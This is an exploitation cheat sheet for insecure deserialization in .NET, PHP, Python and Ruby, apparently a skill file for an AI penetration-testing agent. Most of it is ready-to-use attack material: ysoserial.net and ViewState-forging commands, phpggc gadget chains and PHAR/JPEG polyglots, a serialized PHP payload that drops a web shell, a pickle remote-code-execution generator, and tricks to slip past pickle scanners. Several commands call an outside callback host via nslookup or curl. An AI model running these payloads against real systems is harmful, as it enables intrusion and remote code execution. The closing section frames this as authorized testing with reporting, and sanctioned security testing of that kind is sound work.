# .NET, PHP, Python (and Ruby) Deserialization

## 1. .NET — ysoserial.net

```
ysoserial.exe -h                              # full help
ysoserial.exe --fullhelp                      # per-gadget/plugin details
ysoserial.exe -g <Gadget> -f <Formatter> -o <raw|base64|base64url|hex|hexdump> -c "<cmd>"
```

Formatter must match the sink:

| Sink evidence | Formatter | Go-to gadgets |
|---|---|---|
| `AAEAAAD/////` blob | `BinaryFormatter` | TypeConfuseDelegate, TextFormattingRunProperties, DataSet |
| `__VIEWSTATE` | `LosFormatter` (or `-p ViewState`) | TextFormattingRunProperties, TypeConfuseDelegate |
| SOAP XML with clr-ns | `SoapFormatter` | ActivitySurrogateSelector*, TextFormattingRunProperties |
| JSON with `"$type":` | `Json.Net` (TypeNameHandling != None) | ObjectDataProvider |
| XAML anywhere | `Xaml` | ObjectDataProvider |
| `DataContractSerializer` w/ controllable type | `DataContractSerializer` | WindowsIdentity |

Examples:

```
ysoserial.exe -g ObjectDataProvider -f Json.Net -o base64 -c "nslookup net-<id>.oast.pro"
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "cmd /c whoami > c:\inetpub\wwwroot\o.txt"
ysoserial.exe -g TextFormattingRunProperties -f LosFormatter -o base64 -c "calc"
```

### ViewState plugin (the big one)

No MAC (`enableViewStateMac=false`, pre-2014 defaults) → raw LosFormatter
payload straight into `__VIEWSTATE`. With a **leaked machineKey** (web.config
via LFI/backup files, default/shared keys lists, Exchange/SharePoint CVEs):

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --validationalg="SHA1" --validationkey="B6C...KEY" \
  --generator=ABCD1234 -c "nslookup vs-<id>.oast.pro"
# --generator = __VIEWSTATEGENERATOR value; or use --path="/page.aspx" --apppath="/"
# .NET 4.5+ encrypted viewstate: add --decryptionalg + --decryptionkey, drop --generator, use --islegacy as needed
ysoserial.exe -p DotNetNuke -m read_file -f "/windows/win.ini"   # DNN cookie plugin
```

Deliver as the `__VIEWSTATE` POST field (URL-encode the base64). Errors
`Validation of viewstate MAC failed` = wrong key/generator, not a dead end.

## 2. PHP — unserialize() object injection & phpggc

### phpggc

```
phpggc -l                                 # all chains
phpggc -l laravel                         # filter
phpggc -i Monolog/RCE1                    # chain info (versions, vector: __destruct etc.)
phpggc Monolog/RCE1 system id             # emit serialized chain to stdout
phpggc -b Monolog/RCE1 system id          # base64
phpggc -u -f Symfony/RCE4 system 'curl http://php-<id>.oast.pro'
    # encoders apply LEFT-TO-RIGHT; -f/--fast-destruct must come FIRST
phpggc -s Monolog/RCE1 system id          # soft-quote (ascii-safe)
phpggc -o payload.txt Guzzle/RCE1 system id
```

`-f/--fast-destruct` wraps the chain in a throwaway array so `__destruct`
fires at the end of the deserializing statement even if the script later
fatals — use it by default for `__destruct`-vector chains.

Chain families to try per framework: Laravel/RCE*, Symfony/RCE*, Monolog/RCE*
(any app bundling monolog — most of them), Guzzle, Doctrine, WordPress/
WooCommerce, Magento, Drupal7, Phalcon, Slim, Yii, ZendFramework, CodeIgniter4.
Identify the stack from composer.lock, error traces, or paths, then `phpggc -l <name>`.

### PHAR deserialization (no unserialize() call needed)

Any file function (`file_exists`, `is_file`, `getimagesize`, `fopen`, …) on a
`phar://` path deserializes the archive's metadata:

```
phpggc -p phar -o evil.phar Monolog/RCE1 system 'id'
phpggc -p zip  -o evil.zip  Monolog/RCE1 system 'id'          # zip-based phar
phpggc -pj innocent.jpg -o evil.jpg Monolog/RCE1 system 'id'  # JPEG/PHAR polyglot
# upload evil.jpg, then make the app touch: phar://uploads/evil.jpg/x
```

Note: PHP 8 made phar metadata deserialization opt-in; works through PHP 7.x.

### Manual gadget hunting

When phpggc lacks a chain: grep the codebase (from source leak/LFI) for
`__destruct`, `__wakeup`, `__toString`, `__call`; chase property-controlled
calls (`$this->logger->log(...)`, `call_user_func($this->cb, ...)`,
`file_put_contents($this->path, $this->data)`). Minimal pattern:

```php
// target class
class Logger { public $file; public $data;
  function __destruct() { file_put_contents($this->file, $this->data); } }
// payload
O:6:"Logger":2:{s:4:"file";s:18:"/var/www/html/s.php";s:4:"data";s:30:"<?php system($_GET['c']); ?>";}
```

`__wakeup` bypass (CVE-2016-7124 era, PHP <5.6.25/<7.0.10): declare more
properties than the class has (`O:6:"Logger":99:{...}`) and `__wakeup` is
skipped while `__destruct` still runs. Cookies: match any base64/urlencode
wrapping; beware PHP's historical `+`→space mangling (use `-u`).

## 3. Python — pickle

`pickle.loads()` (and `pickle.load`, `shelve`, old `joblib`/`torch.load`
defaults, celery pickle serializer, cached sessions) on attacker bytes = RCE:

```python
import pickle, base64, os
class G:
    def __reduce__(self):
        # callable + args tuple, invoked during unpickling
        return (os.system, ("nslookup py-<id>.oast.pro",))
blob = pickle.dumps(G(), protocol=2)       # p2 is widely compatible
print(base64.b64encode(blob).decode())     # or base64.urlsafe_b64encode
```

Output capture variant: `(subprocess.check_output, (["id"],))` — the return
value may land in the deserialized object the app then renders.

Seats: Flask session cookies when the app uses pickle-based serializers
(forge with leaked `SECRET_KEY` via flask-unsign), Django sessions with
`PickleSerializer` (+ SECRET_KEY), `.pkl`/model uploads, Redis/memcached
cache values the app unpickles, numpy `.npy` with `allow_pickle`.

Blocklist bypass (picklescan & friends scan for `os.system`-style names):
swap callables — `builtins.exec` / `builtins.eval` with a code string,
`subprocess.Popen`, `shutil.rmtree`-style primitives, indirect
`getattr`-based GLOBAL resolution, multi-stage pickles. **A scanner is not a
control**: report any attacker-reachable unpickle as critical regardless of
scanning.

## 4. Ruby — Marshal (bonus seat)

`Marshal.load` of `\x04\x08`/`BAh` blobs (old Rails cookies with leaked
`secret_key_base`): universal gadget chains exist per Ruby version
(Gem::Requirement / Gem::Installer chains — vakzz/elttam writeups). Same
method: parse-oracle → OAST command → report.

## 5. Verification & handoff

Every confirmed exploit: capture the generation command, the delivery HTTP
request, and the callback/output; mark the route `exploited` via the
`coverage-assets` skill and file via the `finding-report` skill using the
shapes in `rupu.md` (WSTG-INPV-19, CWE-502, scope endpoint, severity critical).
